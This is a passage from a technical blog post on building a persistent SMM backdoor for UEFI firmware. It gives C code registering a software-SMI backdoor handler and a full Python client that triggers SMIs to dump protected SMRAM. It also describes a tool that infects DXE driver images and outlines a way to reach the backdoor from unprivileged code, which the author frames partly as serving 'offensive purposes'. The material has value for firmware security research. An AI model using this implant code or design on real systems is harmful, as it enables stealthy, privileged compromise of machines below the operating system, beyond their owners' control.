<a href="https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/serial.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/serial.png" style="border: 0px;" height="114" width="403"></a></div>
<br>
The problem is that firmware initializes this controller at relatively 
late stage of DXE phase, so, using COM port we will not see any debug 
messages of <span style="font-family: Courier New, Courier, monospace;">BackdoorEntry()</span>
 and other functions that executing during SMM backdoor initialization. 
Of course, we can write a code that configures super I/O controller 
manually, but such code will be not very reliable because there’s too 
many different controller models with different configuration interfaces
 on the market.<br>
<br>
<span style="font-family: Courier New, Courier, monospace;">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span>
 has the similar problems — it's not available during infected image 
initialization and during runtime phase as well (which is even more 
critical).<br>
<br>
To deal with such unpleasant conditions I implemented debug messages sending functionality in following way:<br>
<br>
<ol>
<li><span style="font-family: Courier New, Courier, monospace;">DbgMsg()</span> function is trying to print each message to the screen and COM port always when it’s possible.</li>
<li>If display and console I/O was not initialized yet — <span style="font-family: Courier New, Courier, monospace;">DbgMsg()</span> saves message text into the global buffer.</li>
<li>Firmware calls notification function that was registered during backdoor initialization when <span style="font-family: Courier New, Courier, monospace;">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</span> becomes available, notification function initializes backdoor console I/O and prints saved messages from global buffer.</li>
</ol>
<br>
This approach allows us to see DXE phase debug messages on the screen 
and receive runtime phase debug messages over the COM port. Of course, 
such solution is not the most convenient one, but it should work on wide
 range of different boards without depending on infected image load 
order.<br>
<br>
Example of on-screen debug messages in final version of SMM backdoor:<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/screen-messages.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/screen-messages.png" style="border: 0px;" height="392" width="520"></a></div>
<br>
<h3>
Communicating with SMM using SW SMI</h3>
<br>
Previously we talked only about SMRAM initialization part of SMM phase, 
second important part is SMI dispatch. All SMI handlers of UEFI SMM 
foundation and SMM protocols can be divided into three categories:<br>
<br>
<ul>
<li>Root SMI controller handlers — main handlers that was registered by calling <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SYSTEM_TABLE2.SmiHandlerRegister()</span> with NULL value of <span style="font-family: Courier New, Courier, monospace;">HandleType</span>.
 This handlers are being called on every SMI generated on CPU. Usually, 
root SMI handler code determinates interrupt source and calls 
appropriate child SMI controller handler.</li>
<li>Child SMI controller handlers — handles single interrupt source. SMM protocol drivers registers such handlers by calling <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SYSTEM_TABLE2.SmiHandlerRegister()</span> with non-NULL value of <span style="font-family: Courier New, Courier, monospace;">HandleType</span>. Child handler of specific SMM protocol is calling SMI handlers that was registered using this protocol API.</li>
<li>SMI handlers — protocol specific handlers that can be registered and unregistered by other SMM drivers.</li>
</ul>
<br>
Platform Initialization Specification defines the following SMM child dispatch protocols:<br>
<br>
<ul>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SW_DISPATCH2_PROTOCOL</span> — Provides dispatch service for SMI that was generated by writing a value to APMC I/O port B2h.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SX_DISPATCH2_PROTOCOL</span> — Provides dispatch service for ACPI Sx events.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL</span> — Provides dispatch service for APIC timer events.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_USB_DISPATCH2_PROTOCOL</span> — Provides dispatch service for USB bus events.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_GPI_DISPATCH2_PROTOCOL</span> — Provides dispatch service for General Purpose Input (GPI) SMI source.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_STANDBY_BUTTON_DISPATCH2_PROTOCOL</span> — Provides dispatch service for standby button SMI source.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_POWER_BUTTON_DISPATCH2_PROTOCOL</span> — Provides dispatch service for power button SMI source.</li>
<li><span style="font-family: Courier New, Courier, monospace;">EFI_SMM_IO_TRAP_DISPATCH2_PROTOCOL</span> — Provides dispatch service for I/O instruction restart events.</li>
</ul>
<br>
Of course, not all firmware vendors implements all these protocols, but 
most of them should be available on any UEFI compatible hardware.<br>
<br>
The easiest way to communicate with SMM backdoor is triggering SMI using I/O port B2h. <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SW_DISPATCH2_PROTOCOL</span>
 allows us to register a SMI handler that will be called when some code 
that running under operating system will write a number of the handler 
into this I/O port:<br>
<pre style="height: 500px; overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #3f7f59;">// software SMI handler number to communicate with the backdoor</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> BACKDOOR_SW_SMI_VAL 0xCC</span>

<span style="color: #3f7f59;">// software SMI handler register context</span>
EFI_SMM_SW_REGISTER_CONTEXT m_SwDispatch2RegCtx = { BACKDOOR_SW_SMI_VAL };

EFI_STATUS EFIAPI SwDispatch2Handler(
    EFI_HANDLE DispatchHandle,
    <span style="color: #7f0055; font-weight: bold;">CONST</span> <span style="color: #7f0055; font-weight: bold;">VOID</span> *Context,
    <span style="color: #7f0055; font-weight: bold;">VOID</span> *CommBuffer,
    UINTN *CommBufferSize)
{
    EFI_SMM_SW_CONTEXT *SwContext = (EFI_SMM_SW_CONTEXT *)CommBuffer;
    EFI_SMM_CPU_PROTOCOL *SmmCpu = <span style="color: #7f0055; font-weight: bold;">NULL</span>;
    EFI_STATUS Status = EFI_SUCCESS;

    DbgMsg(
        __FILE__, __LINE__, 
        __FUNCTION__<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">(): command port = 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">, data port = 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>,
        SwContext-&gt;CommandPort, SwContext-&gt;DataPort
    );

    <span style="color: #3f7f59;">// obtain SMM CPU protocol </span>
    Status = gSmst-&gt;SmmLocateProtocol(&amp;gEfiSmmCpuProtocolGuid, <span style="color: #7f0055; font-weight: bold;">NULL</span>, (<span style="color: #7f0055; font-weight: bold;">PVOID</span> *)&amp;SmmCpu);
    <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
    {
        UINT64 Rcx = 0;                

        <span style="color: #3f7f59;">// query RCX register value from CPU saved state</span>
        Status = SmmCpu-&gt;ReadSaveState(
            SmmCpu, <span style="color: #7f0055; font-weight: bold;">sizeof</span>(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, 
            SwContext-&gt;SwSmiCpuIndex, (<span style="color: #7f0055; font-weight: bold;">PVOID</span>)&amp;Rcx
        );
        <span style="color: #7f0055; font-weight: bold;">if</span> (EFI_ERROR(Status))
        {
            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ReadSaveState() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Status);
            <span style="color: #7f0055; font-weight: bold;">goto</span> _end;
        }

        <span style="color: #3f7f59;">// handle backdoor request</span>
        <span style="color: #3f7f59;">// ...</span>
    }
    <span style="color: #7f0055; font-weight: bold;">else</span>
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">LocateProtocol() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Status);   
    }

_end:

    <span style="color: #7f0055; font-weight: bold;">return</span> EFI_SUCCESS;
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
EFI_STATUS EFIAPI SwDispatch2ProtocolNotifyHandler(
    <span style="color: #7f0055; font-weight: bold;">CONST</span> EFI_GUID *Protocol, 
    <span style="color: #7f0055; font-weight: bold;">VOID</span> *Interface, 
    EFI_HANDLE Handle)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_HANDLE DispatchHandle = <span style="color: #7f0055; font-weight: bold;">NULL</span>;

    <span style="color: #3f7f59;">// obtain target protocol</span>
    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = (EFI_SMM_SW_DISPATCH2_PROTOCOL *)Interface;    

    DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Max. SW SMI value is 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, SwDispatch-&gt;MaximumSwiValue);

    <span style="color: #3f7f59;">// register software SMI handler</span>
    Status = SwDispatch-&gt;Register(
        SwDispatch, 
        SwDispatch2Handler, 
        &amp;m_SwDispatch2RegCtx,
        &amp;DispatchHandle
    );
    <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">SW SMI handler is at </span><span style="color: #2a00ff;">"</span>FPTR<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, SwDispatch2Handler);
    }
    <span style="color: #7f0055; font-weight: bold;">else</span>
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Register() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Status);
    }

    <span style="color: #7f0055; font-weight: bold;">return</span> EFI_SUCCESS;   
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
<span style="color: #7f0055; font-weight: bold;">VOID</span> BackdoorEntrySmm(<span style="color: #7f0055; font-weight: bold;">VOID</span>)
{
    <span style="color: #7f0055; font-weight: bold;">PVOID</span> Registration = <span style="color: #7f0055; font-weight: bold;">NULL</span>;

    <span style="color: #3f7f59;">// ... skipped ...</span>

    <span style="color: #3f7f59;">// register SMM protocol notification</span>
    EFI_STATUS Status = gSmst-&gt;SmmRegisterProtocolNotify(
        &amp;gEfiSmmSwDispatch2ProtocolGuid, 
        SwDispatch2ProtocolNotifyHandler, 
        &amp;Registration
    );
    <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
    {
        DbgMsg(
            __FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">SMM protocol notify handler is at </span><span style="color: #2a00ff;">"</span>FPTR<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>,
            SwDispatch2ProtocolNotifyHandler
        );
    }
    <span style="color: #7f0055; font-weight: bold;">else</span>
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">RegisterProtocolNotify() fails: 0x</span><span style="color: #2a00ff;">%X</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Status);
    }

    <span style="color: #3f7f59;">// ... skipped ...</span>
}
</pre>
<br>
As you can see, backdoor code calls <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SYSTEM_TABLE2.SmmRegisterProtocolNotify()</span> function to be notified when <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SW_DISPATCH2_PROTOCOL</span> will be available. Handler function calls <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_SW_DISPATCH2_PROTOCOL.Register()</span> function to register a SMI handler that will be called when CCh value will be written to B2h I/O port. SMI handler uses <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_CPU_PROTOCOL</span> to get CPU registers values from the saved execution state.<br>
<br>
Now, when we can communicate with the backdoor, let’s implement some 
payload. The most obvious useful thing that we able to do from SMM — 
provide some interface to outside world for dumping of SMRAM contents. I
 designed this interface in following way:<br>
<br>
<ol>
<li>During initialization backdoor calls <span style="font-family: Courier New, Courier, monospace;">EFI_BOOT_SERVICES.AllocatePages()</span> with <span style="font-family: Courier New, Courier, monospace;">EfiRuntimeServicesData</span> value of <span style="font-family: Courier New, Courier, monospace;">MemType</span> argument to allocate 2000h bytes of physical memory that will be available during DXE and runtime phase.</li>
<li>Backdoor stores address of this memory inside firmware variable with
 constant name, so, operating system will be able to obtain the address 
using <span style="font-family: Courier New, Courier, monospace;">EFI_RUNTIME_SERVICES.GetVariable()</span> function. Windows provides access to firmware variables with <span style="font-family: Courier New, Courier, monospace;"><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724325%28v=vs.85%29.aspx">GetFirmwareEnvironmentVariable</a>()</span> function of <span style="font-family: Courier New, Courier, monospace;">kernel32.dll</span> or <span style="font-family: Courier New, Courier, monospace;"><a href="https://msdn.microsoft.com/en-us/library/windows/hardware/jj151553%28v=vs.85%29.aspx">ExGetFirmwareEnvironmentVariable</a>()</span> function of NT kernel. On Linux firmware variables are available as pseudo-files in <span style="font-family: Courier New, Courier, monospace;"><a href="https://www.kernel.org/doc/Documentation/ABI/stable/sysfs-firmware-efi-vars">/sys/firmware/efi/efivars</a></span>&nbsp;(or <span style="font-family: Courier New, Courier, monospace;">/sys/firmware/efi/vars</span>) directory that also can be mounted at other location&nbsp;using <span style="font-family: Courier New, Courier, monospace;">mount -t efivars none /some/path</span>.</li>
<li>Non-SMM code stores address of memory page to dump in CPU register 
and triggers SMI by writing constant command number to B2h I/O port.</li>
<li><span style="font-family: Courier New, Courier, monospace;">SwDispath2ProtocolNotifyHandler()</span> backdoor function copies contents of memory page with specified address to previously allocated memory and exits from SMM.</li>
<li>When SMI was fired — non-SMM code queries address of physical memory
 allocated by backdoor from firmware variable and gets contents of the 
dumped memory.</li>
</ol>
<br>
To provide a bit more of useful information to non-SMM code backdoor 
also stores the following structure at the beginning of the allocated 
memory:<br>
<pre style="overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #7f0055; font-weight: bold;">typedef</span> <span style="color: #7f0055; font-weight: bold;">struct</span> _BACKDOOR_INFO
{
    <span style="color: #3f7f59;">// number of SMI that was handled</span>
    UINTN CallsCount;

    <span style="color: #3f7f59;">// EFI_STATUS of last operation</span>
    UINTN BackdoorStatus;

    <span style="color: #3f7f59;">// List of structures with available SMRAM regions information.</span>
    <span style="color: #3f7f59;">// Zero value of EFI_SMRAM_DESCRIPTOR.PhysicalStart means last item of list.</span>
    EFI_SMRAM_DESCRIPTOR SmramMap[];

} BACKDOOR_INFO,
*PBACKDOOR_INFO;
</pre>
<br>
To fill <span style="font-family: Courier New, Courier, monospace;">SmramMap</span> field backdoor calls the <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_ACCESS2_PROTOCOL.GetCapabilities()</span> function that returns <span style="font-family: Courier New, Courier, monospace;">EFI_SMRAM_DESCRIPTOR</span> structures with required information.<br>
<br>
<a href="https://github.com/chipsec/chipsec">CHIPSEC, a firmware security assessment framework from Intel</a>,
 provides a handy cross-platform Python API for different hardware and 
firmware features: reading of physical memory, EFI variables and PCI 
config space, SMI triggering, etc. Let’s write some backdoor 
communication code to utilize the SMRAM dumping feature:<br>
<pre style="height: 500px; overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #7f0055; font-weight: bold;">import</span> sys, os
<span style="color: #7f0055; font-weight: bold;">from</span> struct <span style="color: #7f0055; font-weight: bold;">import</span> pack, unpack

<span style="color: #3f7f59;"># path to the CHIPSEC folder</span>
CHIPSEC_PATH = <span style="color: #2a00ff;">'/opt/chipsec/source/tool'</span>

sys.path.append(CHIPSEC_PATH)

<span style="color: #3f7f59;"># SW SMI command value for communicating with backdoor SMM code</span>
BACKDOOR_SW_SMI_VAL = 0xCC

<span style="color: #3f7f59;"># SW SMI commands for backdoor</span>
BACKDOOR_SW_DATA_READ_PHYS_MEM  = 1 <span style="color: #3f7f59;"># read physical memory command</span>

<span style="color: #3f7f59;"># EFI variable with struct _BACKDOOR_INFO physical address</span>
BACKDOOR_INFO_EFI_VAR = <span style="color: #2a00ff;">'SmmBackdoorInfo-3a452e85-a7ca-438f-a5cb-ad3a70c5d01b'</span>
BACKDOOR_INFO_FMT = <span style="color: #2a00ff;">'QQ'</span>
BACKDOOR_INFO_LEN = 8 * 2

PAGE_SIZE = 0x1000

cs = None

<span style="color: #7f0055; font-weight: bold;">class</span> Chipsec(<span style="color: #7f0055; font-weight: bold;">object</span>):

    <span style="color: #7f0055; font-weight: bold;">def</span> __init__(self, uefi, mem, ints):

        self.uefi, self.mem, self.ints = uefi, mem, ints

<span style="color: #7f0055; font-weight: bold;">def</span> efi_var_get(name):

    <span style="color: #3f7f59;"># parse variable name string of name-GUID format</span>
    name = name.split(<span style="color: #2a00ff;">'-'</span>)

    <span style="color: #7f0055; font-weight: bold;">return</span> cs.uefi.get_EFI_variable(name[0], <span style="color: #2a00ff;">'-'</span>.join(name[1:]), None)

<span style="color: #3f7f59;"># helpers for EFI variables with numeric value</span>
efi_var_get_8 = <span style="color: #7f0055; font-weight: bold;">lambda</span> name: unpack(<span style="color: #2a00ff;">'B'</span>, efi_var_get(name))[0]
efi_var_get_16 = <span style="color: #7f0055; font-weight: bold;">lambda</span> name: unpack(<span style="color: #2a00ff;">'H'</span>, efi_var_get(name))[0]
efi_var_get_32 = <span style="color: #7f0055; font-weight: bold;">lambda</span> name: unpack(<span style="color: #2a00ff;">'I'</span>, efi_var_get(name))[0]
efi_var_get_64 = <span style="color: #7f0055; font-weight: bold;">lambda</span> name: unpack(<span style="color: #2a00ff;">'Q'</span>, efi_var_get(name))[0]

<span style="color: #7f0055; font-weight: bold;">def</span> mem_read(addr, size): 

    <span style="color: #7f0055; font-weight: bold;">return</span> cs.mem.read_phys_mem(addr, size)

<span style="color: #3f7f59;"># helpers to read numeric values from physical memory</span>
mem_read_8 = <span style="color: #7f0055; font-weight: bold;">lambda</span> addr: unpack(<span style="color: #2a00ff;">'B'</span>, mem_read(addr, 1))[0]
mem_read_16 = <span style="color: #7f0055; font-weight: bold;">lambda</span> addr: unpack(<span style="color: #2a00ff;">'H'</span>, mem_read(addr, 2))[0]
mem_read_32 = <span style="color: #7f0055; font-weight: bold;">lambda</span> addr: unpack(<span style="color: #2a00ff;">'I'</span>, mem_read(addr, 4))[0]
mem_read_64 = <span style="color: #7f0055; font-weight: bold;">lambda</span> addr: unpack(<span style="color: #2a00ff;">'Q'</span>, mem_read(addr, 8))[0]

<span style="color: #7f0055; font-weight: bold;">def</span> get_backdoor_info_addr():

    <span style="color: #3f7f59;"># retuen address of the physical memory with BACKDOOR_INFO structure</span>
    <span style="color: #7f0055; font-weight: bold;">return</span> efi_var_get_64(BACKDOOR_INFO_EFI_VAR)

<span style="color: #7f0055; font-weight: bold;">def</span> get_backdoor_info(addr = None):

    addr = get_backdoor_info_addr() <span style="color: #7f0055; font-weight: bold;">if</span> addr <span style="color: #7f0055; font-weight: bold;">is</span> None <span style="color: #7f0055; font-weight: bold;">else</span> addr

    <span style="color: #3f7f59;"># return BACKDOOR_INFO structure fields values</span>
    <span style="color: #7f0055; font-weight: bold;">return</span> unpack(BACKDOOR_INFO_FMT, mem_read(addr, BACKDOOR_INFO_LEN))

<span style="color: #7f0055; font-weight: bold;">def</span> get_backdoor_info_mem(addr = None):

    addr = get_backdoor_info_addr() <span style="color: #7f0055; font-weight: bold;">if</span> addr <span style="color: #7f0055; font-weight: bold;">is</span> None <span style="color: #7f0055; font-weight: bold;">else</span> addr

    <span style="color: #3f7f59;"># return the raw data of BACKDOOR_INFO structure</span>
    <span style="color: #7f0055; font-weight: bold;">return</span> mem_read(addr + PAGE_SIZE, PAGE_SIZE)

<span style="color: #7f0055; font-weight: bold;">def</span> get_smram_info():

    ret = []  
    backdoor_info = get_backdoor_info_addr()  
    addr, size = backdoor_info + BACKDOOR_INFO_LEN, 8 * 4    

    <span style="color: #3f7f59;"># dump array of EFI_SMRAM_DESCRIPTOR structures</span>
    <span style="color: #7f0055; font-weight: bold;">while</span> True:

        <span style="color: #3f7f59;">'''</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;typedef struct _EFI_SMRAM_DESCRIPTOR </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EFI_PHYSICAL_ADDRESS
 PhysicalStart; </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EFI_PHYSICAL_ADDRESS CpuStart; </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UINT64 PhysicalSize; </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UINT64 RegionState;</span>
<span style="color: #3f7f59;"></span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} EFI_SMRAM_DESCRIPTOR;</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'''</span>            
        physical_start, cpu_start, physical_size, region_state = \
            unpack(<span style="color: #2a00ff;">'Q'</span> * 4, mem_read(addr, size))            

        <span style="color: #7f0055; font-weight: bold;">if</span> physical_start == 0:

            <span style="color: #3f7f59;"># no more items</span>
            <span style="color: #7f0055; font-weight: bold;">break</span>

        ret.append(( physical_start, physical_size, region_state ))
        addr += size

    <span style="color: #7f0055; font-weight: bold;">return</span> ret

<span style="color: #7f0055; font-weight: bold;">def</span> send_sw_smi(command, data, arg):

    <span style="color: #3f7f59;"># generate software SMI: data will be written to B2h port, arg will be copied to RCX</span>
    cs.ints.send_SW_SMI(command, data, 0, 0, arg, 0, 0, 0)

<span style="color: #7f0055; font-weight: bold;">def</span> dump_mem_page(addr, count = None):

    ret = <span style="color: #2a00ff;">''</span>
    backdoor_info = get_backdoor_info_addr()
    count = 1 <span style="color: #7f0055; font-weight: bold;">if</span> count <span style="color: #7f0055; font-weight: bold;">is</span> None <span style="color: #7f0055; font-weight: bold;">else</span> count    

    <span style="color: #3f7f59;"># dump specified amount of memory pages starting from addr</span>
    <span style="color: #7f0055; font-weight: bold;">for</span> i <span style="color: #7f0055; font-weight: bold;">in</span> <span style="color: #7f0055; font-weight: bold;">range</span>(count):

        <span style="color: #3f7f59;"># send read memory page command to SMM code</span>
        page_addr = addr + PAGE_SIZE * i
        send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_PHYS_MEM, page_addr)

        <span style="color: #3f7f59;"># read dumped page from physical memory</span>
        _, last_status = get_backdoor_info(addr = backdoor_info)
        <span style="color: #7f0055; font-weight: bold;">if</span> last_status != 0:

            <span style="color: #7f0055; font-weight: bold;">raise</span> Exception(<span style="color: #2a00ff;">'SMM backdoor error 0x%.8x'</span> % last_status)

        ret += get_backdoor_info_mem(addr = backdoor_info)

    <span style="color: #7f0055; font-weight: bold;">return</span> ret

<span style="color: #7f0055; font-weight: bold;">def</span> dump_smram():

    <span style="color: #7f0055; font-weight: bold;">try</span>:

        contents = []

        <span style="color: #7f0055; font-weight: bold;">print</span> <span style="color: #2a00ff;">'[+] Dumping SMRAM regions, this may take a while...'</span>

        <span style="color: #3f7f59;"># enumerate and dump available SMRAM regions</span>
        <span style="color: #7f0055; font-weight: bold;">for</span> region <span style="color: #7f0055; font-weight: bold;">in</span> get_smram_info():        
            
            region_addr, region_size, _ = region
            name = <span style="color: #2a00ff;">'SMRAM_dump_%.8x_%.8x.bin'</span> % (region_addr, region_addr + region_size - 1)

            <span style="color: #3f7f59;"># dump region contents            </span>
            data = dump_mem_page(region_addr, region_size / PAGE_SIZE)

            contents.append(( name, data ))

        <span style="color: #3f7f59;"># save dumped data to files</span>
        <span style="color: #7f0055; font-weight: bold;">for</span> name, data <span style="color: #7f0055; font-weight: bold;">in</span> contents:

            <span style="color: #7f0055; font-weight: bold;">with</span> <span style="color: #7f0055; font-weight: bold;">open</span>(name, <span style="color: #2a00ff;">'wb'</span>) <span style="color: #7f0055; font-weight: bold;">as</span> fd:

                <span style="color: #7f0055; font-weight: bold;">print</span> <span style="color: #2a00ff;">'[+] Creating'</span>, name
                fd.write(data) 

    <span style="color: #7f0055; font-weight: bold;">except</span> IOError, why:

        <span style="color: #7f0055; font-weight: bold;">print</span> <span style="color: #2a00ff;">'[!]'</span>, <span style="color: #7f0055; font-weight: bold;">str</span>(why)
        <span style="color: #7f0055; font-weight: bold;">return</span> False

<span style="color: #7f0055; font-weight: bold;">def</span> chipsec_init():

    <span style="color: #7f0055; font-weight: bold;">global</span> cs

    <span style="color: #3f7f59;"># import CHIPSEC modules</span>
    <span style="color: #7f0055; font-weight: bold;">import</span> chipsec.chipset
    <span style="color: #7f0055; font-weight: bold;">import</span> chipsec.hal.uefi
    <span style="color: #7f0055; font-weight: bold;">import</span> chipsec.hal.physmem
    <span style="color: #7f0055; font-weight: bold;">import</span> chipsec.hal.interrupts

    <span style="color: #3f7f59;"># initialize helper</span>
    _cs = chipsec.chipset.cs()
    _cs.init(None, True)
    
    cs = Chipsec(chipsec.hal.uefi.UEFI(_cs.helper),
                 chipsec.hal.physmem.Memory(_cs.helper),
                 chipsec.hal.interrupts.Interrupts(_cs))

<span style="color: #7f0055; font-weight: bold;">if</span> __name__ == <span style="color: #2a00ff;">'__main__'</span>:
    
    chipsec_init()
    dump_smram()
</pre>
<br>
I implemented a small program called <span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.py</span>
 that allows to infect extracted DXE drivers with backdoor code and 
interact with installed backdoor using software SMI. Available command 
line options:<br>
<br>
<ul>
<li><span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.py --infect &lt;source_path&gt; --output &lt;dest_path&gt; --payload SmmBackdoor.efi</span> — Infect PE image of DXE driver with backdoor code.</li>
<li><span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.py --test</span> — check for backdoor presence and print status information from <span style="font-family: Courier New, Courier, monospace;">BACKDOOR_INFO</span> structure.</li>
<li><span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.py --dump-smram</span> — dump all available SMRAM regions into the files.</li>
<li><span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.py --read-phys &lt;address&gt;</span> — print hexadecimal dump of physical memory page at given address.</li>
<li><span style="font-family: Courier New, Courier, monospace;">SmmBackdoor.py --read-virt &lt;address&gt;</span> — print hexadecimal dump of virtual memory page at given address.</li>
</ul>
<br>
Usage example — dumping CSEG and TSEG regions of SMRAM:<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/smram-dump.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/smram-dump.png" style="border: 0px;" height="417" width="635"></a></div>
<br>
Probably, you already noticed that software SMI communication method has
 a serious limitation: we need to be a root/Administator to trigger SMI 
and get access to physical memory. It's still good if you planning to 
use such backdoor for research or reverse engineering, but for offensive
 purposes we need to find some better way to call the backdoor code that
 will work with any privileges level.<br>
<br>
<h3>
Communicating with SMM using APIC timer</h3>
<br>
After discovering of available SMM child dispatch protocols capabilities I figured that <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL</span> allows to configure <a href="https://en.wikipedia.org/wiki/Advanced_Programmable_Interrupt_Controller">Advanced Programmable Interrupt Controller</a> (APIC) timer to fire SMI with specified time intervals, so, it's possible to implement the following communication method:<br>
<br>
<ol>
<li>Non-SMM code copies backdoor command arguments with the magic constants to CPU registers and jumps into infinite loop.</li>
<li>When SMI timer handler that was registered by backdoor with <span style="font-family: Courier New, Courier, monospace;">EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL.Register()</span>
 function is being called — it checks saved execution context for 
register values with magic constants, if they was found — it executes 
specified command and modifies saved instruction pointer value to let 
the non-SMM code quit from infinite loop.</li>
<li>Backdoor also can do virtual to physical address translation to copy
 some return data to buffer that was passed from non-SMM code.</li>
</ol>
<br>
The client code for this method will be simple enough, without 
dependencies on any API or execution environment. It works with any 
privileges level — from sandboxed user mode applications to ring 0 code.<br>
<br>
Backdoor code that registers the SMI timer handler:<br>
